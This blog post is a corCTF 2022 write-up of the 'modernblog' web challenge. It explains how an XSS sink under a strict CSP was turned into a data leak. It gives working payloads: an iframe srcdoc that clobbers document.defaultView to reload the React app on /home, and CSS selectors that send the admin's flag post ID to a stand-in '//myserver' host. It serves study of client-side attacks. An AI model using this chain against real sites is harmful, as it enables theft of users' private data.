---
title: "corCTF 2022 writeup - modernblog"
date: 2022-08-21 13:43:37
tags: [Security]
categories: [Security]
---
<img src="/img/corctf-2022-modern-blog-writeup/cover-en.png" style="display:none">

At first, I had no intention of writing a post about this challenge because the author already had a greate one: [corCTF 2022 Challenge Writeups](https://brycec.me/posts/corctf_2022_challenges#modernblog). But, it's my first time being the only solver for a challenge, it's still worth writing one.

In this post, I will talk about how I tackled the challenge in the first place and how I solved it in the end.

<!-- more -->

## About the challenge

![index page](/img/corctf-2022-modern-blog-writeup/p1.png)

modernblog is a simple blog website built with React for Front-end, Node.js and Express for Back-end.

The feature is simple, just like other CTF challenges, you can register, login, and create a post. Following is the screenshot of `/home` page, which shows all your posts:

![posts page](/img/corctf-2022-modern-blog-writeup/p2.png)

There is a bot that you can submit an URL and it will visit. When you see a browser bot, it means the challenge is usually about client-side vulnerability.

The code for the bot is simple, just log in as admin and visit the provided valid URL(only URL that starts with `http://` or `https://` is allowed):

``` js
// npm i puppeteer
// script to emulate admin bot

const puppeteer = require("puppeteer");

const USERNAME = "YOUR_USER";
const PASSWORD = "TEST_PASSWORD";
const SITE = "https://modernblog.be.ax";

const visit = async (url) => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        let page = await browser.newPage();
        await page.goto(SITE + "/login", { timeout: 3000, waitUntil: 'domcontentloaded' });

        await page.type("input[name=user]", USERNAME);
        await page.type("input[name=pass]", PASSWORD);
        await page.click("button[type=submit]");

        await page.waitForTimeout(3000);

        await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' })
        await page.waitForTimeout(5000);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }
};

visit("TARGET_URL");
```

The flag is in a post owned by the admin, created when the server is on:

``` js
(() => {
    const flagId = crypto.randomBytes(6).toString("hex");
    const flag = process.env.FLAG || "flag{test_flag}";
    users.set("admin", {
        pass: sha256(process.env.ADMIN_PASSWORD || "test_password"),
        posts: Object.freeze([flagId]),
    });
    posts.set(flagId, {
        id: flagId,
        title: "Flag",
        body: flag,
    });
})();
```

There is no permission check for viewing a post, it means that if we know `flagId`, we can see the content and get the flag.

The front-end codebase is small, and only one obvious vulnerability when rendering a post:

``` js
{/* CSP is on, so this should be fine, right? */}
{/* Clueless */}
<div dangerouslySetInnerHTML={{ __html: body }}></div>
```

The project is built with React, a popular library made by Meta(Facebook). Everything you render in React will be escaped automatically(it's great for developers) unless you use a very long attribute name: `dangerouslySetInnerHTML`. As the name implies, you can set `innerHTML` via this attribute.

React team chose this name on purpose, because they want you to know that this attribute is dangerous and prone to XSS.

So, now we have an XSS, just do `<svg onload>` and leak the flag?

Not yet, don't forget the CSP.

## CSP Bypass

Here is the CSP for this challenge:

``` js
app.use((req, res, next) => {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self'; object-src 'none'; base-uri 'none';"
    );
    if (req.session.user && users.has(req.session.user)) {
        req.user = users.get(req.session.user);
    }
    next();
});
```

You can't inject your script because of the CSP, and this CSP is quite strict. When it comes to the client-side challenge, CSP is usually a good hint. I can think of a few techniques that it's allowed from this CSP:

1. CSS injection (`<style>` and image are allowed)
2. DOM clobbering (input is not sanitized)
3. `<meta>` tag
4. Inject the script in same origin (`self` is allowed)
5. `<iframe>` is allowed

## First thoughts - CSS injection

My first idea is about CSS injection.

If we can inject the style into the `/home` page which renders all the posts, we can steal the `href` which is `flagId` by doing this:

``` css
a[href^="/post/0"] {
  background: url(//myserver?c=0);
}

a[href^="/post/1"] {
  background: url(//myserver?c=1);
}

// ...
```

But, is it possible?

When the admin bot visits our URL, it's `/post/random_id`, we can inject the style on this page for sure, but when we change the location to `/home`, the injected style is cleared. It seems not work.

How about iframe?

I know the style won't affect the content in an iframe if it's cross-origin, how about same-origin? Can we affect the style of an same-origin iframe? Although I think it's not possible, I still spent some times to explore this option. But, this way also not work in the end.

## Other approaches

DOM clobbering seems useless here, becasue I have never seen any DOM clobbering gadgets for React. Also, this React app uses no global variable.

How about `meta` tag?

I have seen some challenges abusing `<meta>` tag to do redirection and use `Referer` header to leak the URL, is it useful here? Probably not. Because it's meaningless to leak the URL here unless the admin bot clicks the post. I also checked the spec for `meta` tag to find is there are any unknown attributes, and found nothing in the end.

How about XSLeaks? Can we leak the `href`?

I tried to recall all the XSLeaks challenges I have seen, and I thought XSLeaks is also not helpful for this challenge. The reason is simple, how can we leak the `href` attribute? If the `flagId` is shown on the page, maybe we can try to leak it, but `flagId` is not even shown on the page, not possible to leak it.

After thinking of so many ways but finding nothing useful, I decided to move my focus back to the `script` element.

## self script

I thought that maybe there is an API in back-end which outputs arbitrary content so that I can use that API as a source of script, like JSONP. It's allowed because it's same-origin. For example, `<script src="/apis/example?content=alert(1)">`

By the way, loads a script via `innerHTML` is useless because the script won't get executed according to the [spec](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations).

So we need to use `<iframe srcdoc>`, like this: `<iframe srcdoc="<script src='...'>"></iframe>`

Here are all the APIs in the back-end:

```js
app.post("/api/login", (req, res) => {
    let { user, pass } = req.body;
    if (
        !user ||
        !pass ||
        typeof user !== "string" ||
        typeof pass !== "string"
    ) {
        return res.json({
            success: false,
            error: "Missing username or password",
        });
    }

    if (!users.has(user)) {
        return res.json({
            success: false,
            error: "No user exists with that username",
        });
    }

    if (users.get(user).pass !== sha256(pass)) {
        return res.json({ success: false, error: "Invalid password" });
    }

    req.session.user = user;
    res.json({ success: true });
});

app.post("/api/register", (req, res) => {
    let { user, pass } = req.body;
    if (
        !user ||
        !pass ||
        typeof user !== "string" ||
        typeof pass !== "string"
    ) {
        return res.json({
            success: false,
            error: "Missing username or password",
        });
    }

    if (user.length < 5 || pass.length < 7) {
        return res.json({
            success: false,
            error: "Please choose a longer username or password",
        });
    }

    if (users.has(user)) {
        return res.json({
            success: false,
            error: "A user exists with that username",
        });
    }

    req.session.user = user;
    users.set(user, {
        pass: sha256(pass),
        posts: [],
    });

    res.json({ success: true });
});

const requiresLogin = (req, res, next) =>
    req.user
        ? next()
        : res.json({ success: false, error: "You must be logged in!" });

app.post("/api/create", requiresLogin, (req, res) => {
    if (req.session.user === "admin") {
        return res.json({ success: false, error: "uhhhhh... no" });
    }

    let { title, body } = req.body;
    if (
        !title ||
        !body ||
        typeof title !== "string" ||
        typeof body !== "string"
    ) {
        return res.json({ success: false, error: "Missing title or body" });
    }

    let id = crypto.randomBytes(6).toString("hex");

    posts.set(id, { id, title, body });
    req.user.posts.push(id);

    res.json({ success: true });
});

app.post("/api/posts", requiresLogin, (req, res) => {
    return res.json({
        success: true,
        data: req.user.posts.map((id) => posts.get(id)),
    });
});

app.get("/api/post/:id", requiresLogin, (req, res) => {
    let { id } = req.params;
    if (!id) {
        return res.json({ success: false, error: "No id provided" });
    }
    if (!posts.has(id)) {
        return res.json({
            success: false,
            error: "No post was found with that id",
        });
    }
    return res.json({ success: true, data: posts.get(id) });
});

app.get("*", (req, res) => res.sendFile("index.html", { root: "public" }));
```

There are only two endpoints for `GET`:

``` js
app.get("/api/post/:id", requiresLogin, (req, res) => {
    let { id } = req.params;
    if (!id) {
        return res.json({ success: false, error: "No id provided" });
    }
    if (!posts.has(id)) {
        return res.json({
            success: false,
            error: "No post was found with that id",
        });
    }
    return res.json({ success: true, data: posts.get(id) });
});

app.get("*", (req, res) => res.sendFile("index.html", { root: "public" }));
```

The first one is rendered with `res.json`, so its content type is `application/json`, impossible to make it a valid script. The second one is for rendering static files, which are also useless.

How about other script types?

## Other script types

I wrote a post about different script types: [How much do you know about script type? ](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/).

Besides normal scripts, there are a few unpopular types:

1. webbundle
2. importmap
3. speculationrules

For `webbundle`, you can load a `wbn` file and specify resources. When the browser wants to load these resources, it loads from `wbn` file first instead of sending a request to the server.

``` html
<script type="webbundle">
{
   "source": "https://example.com/dir/subresources.wbn",
   "resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
```

For `importmap`, you can specify the `alias` for importing script:

``` html
<script type="importmap">
{
  "imports": {
    "moment": "/node_modules/moment/src/moment.js",
    "lodash": "/node_modules/lodash-es/lodash.js"
  }
}
</script>
```

When you use `import * from memoent`, it's actually import from `/node_modules/moment/src/moment.js`.

Unfortunately, both do not work. Because it's still considered as an inline script, thus blocked by the CSP.

After trying all the approaches I mentioned above, it was  already late, so I went to bed. When I was about to sleep, one thing came to my mind: 

> How about including `index.js` again? So that I can render another React app in an iframe, maybe combined with DOM clobbering to mess up something?

## Render a React app inside a React app

The next morning, I tried this approach immediately, and it worked to some extent:

``` html
<iframe srcdoc="
  <div id=root></div>
  <script type=module crossorigin src=/assets/index.7352e15a.js></script>
" height="1000px" width="500px"></iframe>
```

![error](/img/corctf-2022-modern-blog-writeup/p3.png)

The script is loaded but something wrong with `react-router`, here is the exception:

> DOMException: Failed to execute 'replaceState' on 'History': A history state object with URL 'about:srcdoc' cannot be created in a document with origin 'http://localhost:8080' and URL 'about:srcdoc'.

To know why this exception occurs, we need to know how routing is implemented in this app.

There is a library called [react-router](https://reactrouter.com/), which is very popular for dealing with routing in React. We can see it's usage in `main.jsx`:

``` js
ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <ChakraProvider>
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/register" element={<Register />} />
          <Route path="/login" element={<Login />} />
          <Route path="/home" element={<Home />} />
          <Route path="/post/:id" element={<Post />} />
        </Routes>
      </BrowserRouter>
    </ChakraProvider>
  </React.StrictMode>
);
```

It's just a simple mapping, for example, `/home` renders `<Home />` component.

When you click a link and navigate to another page, it's not actually the "page" in the sense of the traditional web. On traditional web, when clicking a link and navigating to another page, the browser sends another GET request to the server, and the server returns the response, then the browser renders the response with a new URL.

In React, or more precisely, in every SPA(Single Page Application), the routing is handled by `history` object, not browser. So, when you click a link to `/home`, the browser will not send a new request to the server. How about the URL? We use `history.pushState` or `history.replaceState` to update the URL to make it looks like another "page".

From the exception, we know it's something to do with `replaceState`.

When `<BrowserRouter>` is mounted, it calls [createBrowserHistory](https://github.com/remix-run/history/blob/dev/packages/history/index.ts#L364), following is the source code:

``` js
export function createBrowserHistory(
  options: BrowserHistoryOptions = {}
): BrowserHistory {
  let { window = document.defaultView! } = options;
  let globalHistory = window.history;

  function getIndexAndLocation(): [number, Location] {
    let { pathname, search, hash } = window.location;
    let state = globalHistory.state || {};
    return [
      state.idx,
      readOnly<Location>({
        pathname,
        search,
        hash,
        state: state.usr || null,
        key: state.key || "default",
      }),
    ];
  }

  // ignore...

  let action = Action.Pop;
  let [index, location] = getIndexAndLocation();
  let listeners = createEvents<Listener>();
  let blockers = createEvents<Blocker>();

  // error becasue of here
  if (index == null) {
    index = 0;
    globalHistory.replaceState({ ...globalHistory.state, idx: index }, "");
  }
}
```

`index` is `null`, so it calls `globalHistory.replaceState` and triggers the error. The URL of iframe is `about:srcdoc`, `replaceState` is not a valid operation.

My first idea is, can we use DOM clobbering to manipulate `index`? So that `index == null` is false, then `globalHistory.replaceState` is not called.

## DOM clobbering

From the code above, we know that `index` is actually `window.history.state.idx`. `history` already exists, so we can't clobber `window.history`. We can only clobber a non-exist property on `window`, like `window.DEV` or `window.ctf`.

But if you look carefully, there is another interesting part at the beginning:

``` js
let { window = document.defaultView! } = options;
```

`window` is from `document.defaultView`. Although we can't clobber `window.history`, we can clobber `document.defaultView.history`, like this:

``` html
<form name="defaultView">
  <img name="history">
</form>
```

`document.defaultView.history` is `<img name="history">`.

But, we need to clobber `document.defaultView.history.state.idx`, it's deeper. We need `iframe` to achieve this.

For example, the following payload generated by [DOM Clobber3r](https://splitline.github.io/DOM-Clobber3r/)  clobber `document.a.b.c.d`:

``` html
<iframe name=a srcdoc="
  <iframe name=b srcdoc=&quot;
    <iframe name=c srcdoc=&amp;quot;
      <a id='d'></a>
    &amp;quot;></iframe>
  &quot;></iframe>
"></iframe>
```

So, let's update this to `document.defaultView.history.state.idx`:

``` html
<iframe name=defaultView srcdoc="
  <iframe name=history srcdoc=&quot;
    <iframe name=state srcdoc=&amp;quot;
      <a id='idx'></a>
    &amp;quot;></iframe>
  &quot;></iframe>
"></iframe>
```

After trying this in the browser, I realized it was not working.

Because `document.defaultView` is the `window` object of the iframe, so `document.defaultView.history` is the built-in history object instead of `<iframe name=history>`. We go back to what we started, we can't clobber `window.history` because it's already there.

At that moment, I also realized another thing.

Since `document.defaultView` is the `window` object of the iframe, what if I inject something like `<iframe name=defaultView src="/home">`?

By doing so, `document.defaultView.history` is the history object of the `home` page!

I tried this way immediately, and here is the result:

![result](/img/corctf-2022-modern-blog-writeup/p4.png)

That's amazing, I successfully render another React app with a different URL.

Here is the HTML code:

```html
<iframe srcdoc="
  iframe /home below<br>
  <iframe name=defaultView src=/home></iframe><br>
  iframe /home above<br>

  react app below<br>
  <div id=root></div>
  <script type=module crossorigin src=/assets/index.7352e15a.js></script>
" height="1000px" width="500px"></iframe>
```

This works because `react-router` tries to use `document.defaultView.history` to manipulate the URL, including loading the correct page. Since we clobber `document.defaultView`, the `document.defaultView.history` is the history of `/home` page now, thus render `/home` page instead of `/`.

Do you remember what I said at the beginning? I said that if we can inject style to `/home` page, it's trivial to use CSS injection to steal the `href` attribute, it's exactly the case now.

Example:

```html
<iframe srcdoc="
  iframe /home below<br>
  <iframe name=defaultView src=/home></iframe><br>
  iframe /home above<br>
  <style>
    a[href^="/post/0"] {
      background: url(//myserver?c=0);
    }

    a[href^="/post/1"] {
      background: url(//myserver?c=1);
    }
  
  </style>

  react app below<br>
  <div id=root></div>
  <script type=module crossorigin src=/assets/index.7352e15a.js></script>
" height="1000px" width="500px"></iframe>
```

We can leak 1 or 2 chars for each submission. After a few submissions, we can leak the whole flagId and get the flag.

## Conclusion

This challenge is pretty cool, and it's indeed a new way to exploit DOM clobbering, bring this to another level. More importantly, this bug is in a real-world library, a mainstream library to handle routing in React ecosystem.

Kudos to the author [@Strellic_](https://twitter.com/Strellic_) for making such a fantastic challenge. I really liked and enjoyed it. 